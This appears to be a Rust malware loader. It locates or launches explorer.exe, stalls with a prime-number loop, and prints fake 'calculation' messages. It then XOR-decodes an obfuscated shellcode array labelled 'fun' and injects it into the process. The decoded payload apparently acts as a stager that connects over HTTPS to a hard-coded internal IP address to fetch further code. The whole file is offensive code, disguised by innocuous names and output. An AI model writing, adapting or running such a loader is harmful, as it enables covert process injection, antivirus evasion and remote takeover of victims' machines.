use process_funny::process_enumeration::get_process_id;
use process_funny::inject_funny::inject_fun;
use std::io::{Error, ErrorKind};
use std::process::Command;


#[no_mangle]
#[inline(never)]
fn calc_primes(iterations: i32) -> () {
    let mut prime = 2;
    let mut i = 0;
    while i < iterations {
        let mut is_prime = true;
        for j in 2..prime {
            if prime % j == 0 {
                is_prime = false;
                break;
            }
        }

        if is_prime {
            i += 1;
        }

        prime += 1;
    }
}

fn xor_array(array: &mut [u8], key: u8) -> () {
    for byte in array {
        *byte ^= key;
    }
}
fn main() -> Result<(), Error> {

    let process_name = "explorer.exe";

    let process_id = get_process_id(&process_name)?;

    let process_id = match process_id {
        Some(value) => value,
        None => {
            match Command::new(process_name).spawn() {
                Ok(child) => {
                    child.id() // Return the ID of the spawned process
                }
                Err(_) => {
                    return Err(Error::new(ErrorKind::Other, "Failed to spawn process"));
                }
            }
        }
    };
    println!("Calulations Started");
    calc_primes(25000);
    println!("Calculations Finished");
    let mut fun: [u8; 1174] = [0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xfb, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x66, 0x61, 0x7f, 0xbc, 0x65, 0x2f, 0x7f, 0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f, 0x36, 0xe7, 0x51, 0xb6, 0x4f, 0x2f, 0x3c, 0x35, 0x38, 0xb2, 0x45, 0x37, 0x37, 0x37, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36, 0xe7, 0x67, 0x73, 0xbc, 0x77, 0x17, 0xbc, 0x7f, 0x2f, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f, 0xc8, 0xfe, 0x7a, 0x06, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7f, 0x06, 0xf7, 0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b, 0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7, 0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33, 0xbf, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x7f, 0x36, 0xe7, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e, 0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f, 0xbc, 0x25, 0xde, 0x7c, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x06, 0xec, 0x64, 0x7e, 0x89, 0x40, 0x5e, 0x59, 0x5f, 0x43, 0x43, 0x47, 0x37, 0x76, 0x61, 0x7f, 0xbe, 0xd6, 0x7e, 0xf0, 0xf5, 0x7b, 0x40, 0x11, 0x30, 0xc8, 0xe2, 0x64, 0x64, 0x7f, 0xbe, 0xd6, 0x64, 0x6d, 0x7a, 0x06, 0xf7, 0x7a, 0x06, 0xfe, 0x64, 0x64, 0x7e, 0x8d, 0x33, 0x28, 0xaa, 0x8c, 0x37, 0x37, 0x37, 0x37, 0xc8, 0xe2, 0x7e, 0xbe, 0xf3, 0xdf, 0x21, 0x37, 0x37, 0x37, 0x06, 0x37, 0x07, 0x37, 0x19, 0x37, 0x07, 0x37, 0x19, 0x37, 0x07, 0x37, 0x19, 0x37, 0x05, 0x37, 0x03, 0x37, 0x05, 0x37, 0x37, 0x37, 0x6d, 0x7f, 0xbe, 0xf6, 0x7e, 0xf0, 0xf7, 0xcc, 0x17, 0x37, 0x37, 0x7a, 0x06, 0xfe, 0x7e, 0x8d, 0x71, 0xac, 0x29, 0xf5, 0x37, 0x37, 0x37, 0x37, 0xc8, 0xe2, 0xdf, 0xff, 0x36, 0x37, 0x37, 0x5f, 0x37, 0x43, 0x37, 0x43, 0x37, 0x47, 0x37, 0x44, 0x37, 0x0d, 0x37, 0x18, 0x37, 0x18, 0x37, 0x06, 0x37, 0x07, 0x37, 0x19, 0x37, 0x07, 0x37, 0x19, 0x37, 0x07, 0x37, 0x19, 0x37, 0x05, 0x37, 0x03, 0x37, 0x05, 0x37, 0x0d, 0x37, 0x0f, 0x37, 0x03, 0x37, 0x03, 0x37, 0x04, 0x37, 0x18, 0x37, 0x5f, 0x37, 0x52, 0x37, 0x5b, 0x37, 0x5b, 0x37, 0x58, 0x37, 0x19, 0x37, 0x40, 0x37, 0x58, 0x37, 0x51, 0x37, 0x51, 0x37, 0x18, 0x37, 0x53, 0x37, 0x5c, 0x37, 0x73, 0x37, 0x42, 0x37, 0x54, 0x37, 0x4f, 0x37, 0x43, 0x37, 0x45, 0x37, 0x44, 0x37, 0x54, 0x37, 0x45, 0x37, 0x0f, 0x37, 0x03, 0x37, 0x68, 0x37, 0x04, 0x37, 0x5f, 0x37, 0x5a, 0x37, 0x42, 0x37, 0x7d, 0x37, 0x06, 0x37, 0x6d, 0x37, 0x50, 0x37, 0x01, 0x37, 0x5c, 0x37, 0x5e, 0x37, 0x59, 0x37, 0x70, 0x37, 0x66, 0x37, 0x54, 0x37, 0x51, 0x37, 0x04, 0x37, 0x51, 0x37, 0x60, 0x37, 0x6f, 0x37, 0x0e, 0x37, 0x7e, 0x37, 0x07, 0x37, 0x60, 0x37, 0x03, 0x37, 0x7c, 0x37, 0x5c, 0x37, 0x5a, 0x37, 0x70, 0x37, 0x45, 0x37, 0x5c, 0x37, 0x78, 0x37, 0x02, 0x37, 0x64, 0x37, 0x44, 0x37, 0x7e, 0x37, 0x56, 0x37, 0x7b, 0x37, 0x6e, 0x37, 0x5d, 0x37, 0x72, 0x37, 0x1a, 0x37, 0x51, 0x37, 0x42, 0x37, 0x05, 0x37, 0x64, 0x37, 0x5f, 0x37, 0x40, 0x37, 0x6f, 0x37, 0x51, 0x37, 0x58, 0x37, 0x68, 0x37, 0x02, 0x37, 0x72, 0x37, 0x06, 0x37, 0x67, 0x37, 0x5d, 0x37, 0x47, 0x37, 0x70, 0x37, 0x5e, 0x37, 0x64, 0x37, 0x4e, 0x37, 0x7c, 0x37, 0x04, 0x37, 0x4f, 0x37, 0x67, 0x37, 0x58, 0x37, 0x55, 0x37, 0x43, 0x37, 0x74, 0x37, 0x40, 0x37, 0x51, 0x37, 0x7a, 0x37, 0x6d, 0x37, 0x5a, 0x37, 0x04, 0x37, 0x6f, 0x37, 0x05, 0x37, 0x5f, 0x37, 0x4d, 0x37, 0x60, 0x37, 0x74, 0x37, 0x68, 0x37, 0x46, 0x37, 0x53, 0x37, 0x02, 0x37, 0x5b, 0x37, 0x75, 0x37, 0x07, 0x37, 0x72, 0x37, 0x5f, 0x37, 0x4d, 0x37, 0x44, 0x37, 0x6d, 0x37, 0x59, 0x37, 0x73, 0x37, 0x07, 0x37, 0x7f, 0x37, 0x56, 0x37, 0x61, 0x37, 0x5a, 0x37, 0x42, 0x37, 0x61, 0x37, 0x70, 0x37, 0x0f, 0x37, 0x01, 0x37, 0x78, 0x37, 0x0e, 0x37, 0x45, 0x37, 0x00, 0x37, 0x7a, 0x37, 0x4d, 0x37, 0x46, 0x37, 0x7e, 0x37, 0x5d, 0x37, 0x44, 0x37, 0x79, 0x37, 0x73, 0x37, 0x07, 0x37, 0x72, 0x37, 0x5f, 0x37, 0x7f, 0x37, 0x01, 0x37, 0x7e, 0x37, 0x65, 0x37, 0x64, 0x37, 0x1a, 0x37, 0x46, 0x37, 0x58, 0x37, 0x00, 0x37, 0x5a, 0x37, 0x03, 0x37, 0x7f, 0x37, 0x05, 0x37, 0x54, 0x37, 0x03, 0x37, 0x0e, 0x37, 0x07, 0x37, 0x58, 0x37, 0x1a, 0x37, 0x41, 0x37, 0x6e, 0x37, 0x1a, 0x37, 0x43, 0x37, 0x58, 0x37, 0x5f, 0x37, 0x06, 0x37, 0x7f, 0x37, 0x67, 0x37, 0x66, 0x37, 0x51, 0x37, 0x42, 0x37, 0x65, 0x37, 0x78, 0x37, 0x6f, 0x37, 0x07, 0x37, 0x04, 0x37, 0x6f, 0x37, 0x7b, 0x37, 0x58, 0x37, 0x74, 0x37, 0x45, 0x37, 0x45, 0x37, 0x5b, 0x37, 0x62, 0x37, 0x76, 0x37, 0x5e, 0x37, 0x71, 0x37, 0x71, 0x37, 0x59, 0x37, 0x07, 0x37, 0x42, 0x37, 0x46, 0x37, 0x04, 0x37, 0x01, 0x37, 0x70, 0x37, 0x7a, 0x37, 0x56, 0x37, 0x37, 0x37, 0x7f, 0xbe, 0xf6, 0x64, 0x6d, 0x76, 0x6f, 0x7a, 0xbe, 0xf2, 0x7e, 0xb4, 0xf7, 0x19, 0x7a, 0x06, 0xfe, 0x64, 0x7f, 0xf0, 0xf7, 0x37, 0x36, 0xb7, 0x37, 0x67, 0x64, 0x64, 0x7e, 0xf0, 0xf5, 0xaf, 0x27, 0x84, 0x6c, 0xc8, 0xe2, 0x7f, 0xbe, 0xf1, 0x7f, 0xb4, 0xdf, 0x17, 0x7f, 0xbe, 0xd0, 0x7f, 0xbe, 0xce, 0x7e, 0xf0, 0xf5, 0x16, 0x90, 0x3c, 0x57, 0xc8, 0xe2, 0xb2, 0xf7, 0x38, 0xb3, 0x5a, 0x37, 0x37, 0x37, 0x7f, 0xbc, 0x70, 0x3f, 0xb2, 0xf7, 0x43, 0x0d, 0x7f, 0xbe, 0xee, 0x7f, 0xc8, 0xf6, 0x7f, 0xf6, 0xd6, 0x17, 0x66, 0x64, 0x67, 0x7f, 0x8f, 0x34, 0x37, 0x37, 0x37, 0x34, 0x37, 0x37, 0x37, 0x67, 0x7e, 0xbe, 0xd7, 0x7f, 0xb4, 0xdb, 0x17, 0x7f, 0xbe, 0xd0, 0x7e, 0xbe, 0xce, 0x7b, 0xbe, 0xd6, 0x7b, 0xbe, 0xdd, 0x7e, 0xf0, 0xf5, 0xed, 0xea, 0xdd, 0x7e, 0xc8, 0xe2, 0xb2, 0xf7, 0x43, 0x1a, 0xdc, 0x25, 0x7f, 0xbc, 0x70, 0x27, 0xb2, 0xf7, 0x43, 0x14, 0x7f, 0xb4, 0xf0, 0x3f, 0x5d, 0x34, 0x6f, 0x7f, 0xbe, 0x30, 0x7e, 0xbe, 0xcf, 0x5d, 0x2f, 0x76, 0x6e, 0x7f, 0xbe, 0xc6, 0x5d, 0x11, 0x6d, 0x7e, 0x8d, 0xe4, 0x6f, 0xaa, 0xf9, 0x37, 0x37, 0x37, 0x37, 0xc8, 0xe2, 0x5d, 0x3d, 0x68, 0x7f, 0xbe, 0xc6, 0x5d, 0x28, 0x6d, 0x65, 0x5f, 0x37, 0x04, 0x37, 0x37, 0x7e, 0xbe, 0xd7, 0x5d, 0x33, 0x76, 0x6e, 0x7e, 0x8d, 0xe4, 0x6f, 0xaa, 0xf9, 0x37, 0x37, 0x37, 0x37, 0xc8, 0xe2, 0x7a, 0x06, 0xf7, 0x64, 0x6d, 0x7f, 0xbe, 0xc6, 0x7a, 0x06, 0xfe, 0x64, 0x64, 0x64, 0x64, 0x7e, 0x8d, 0xa2, 0x6f, 0x8c, 0xa6, 0x37, 0x37, 0x37, 0x37, 0xc8, 0xe2, 0xb2, 0xf7, 0x42, 0x3b, 0x7f, 0xc8, 0xf8, 0x43, 0x35, 0xdc, 0x8c, 0xdf, 0x4e, 0x37, 0x37, 0x37, 0x7f, 0xbe, 0xc6, 0x64, 0x6d, 0x7e, 0xf0, 0xf5, 0x32, 0xbf, 0xaa, 0x47, 0xc8, 0xe2, 0xb2, 0xf7, 0x43, 0xde, 0x64, 0x7f, 0xbe, 0xd5, 0x64, 0x7e, 0xbe, 0xd6, 0x5d, 0x33, 0x76, 0x6f, 0x7f, 0xbe, 0xc6, 0x7e, 0xf0, 0xf5, 0x5b, 0x1e, 0x13, 0x49, 0xc8, 0xe2, 0xb2, 0xf7, 0x43, 0xfa, 0x7f, 0xb4, 0xf3, 0x1f, 0x64, 0x6e, 0x6d, 0x7f, 0xbe, 0xe4, 0x5d, 0x77, 0x76, 0x6e, 0x7e, 0xf0, 0xf7, 0x37, 0x27, 0x37, 0x37, 0x7e, 0x8d, 0x6f, 0x93, 0x64, 0xd2, 0x37, 0x37, 0x37, 0x37, 0xc8, 0xe2, 0x7f, 0xa4, 0x64, 0x64, 0x7f, 0xbe, 0xd0, 0x7f, 0xbe, 0xc6, 0x7e, 0xbe, 0xf7, 0x7f, 0xbe, 0xed, 0x7e, 0xbe, 0xce, 0x7e, 0xf0, 0xf5, 0x5b, 0x1e, 0x13, 0x49, 0xc8, 0xe2, 0x7f, 0xb4, 0xf3, 0x17, 0xb2, 0xf7, 0x38, 0xb3, 0xb3, 0xc8, 0xc8, 0xc8, 0x6f, 0xf4, 0x6f, 0x5d, 0x37, 0x6e, 0x7e, 0xf0, 0xf5, 0xc7, 0x82, 0x95, 0x61, 0xc8, 0xe2];
    println!("Decoding the Calculations of Math Problem");
    xor_array(&mut fun, 0x37);
    inject_fun(process_id, &fun)?;
    
Ok(())
}
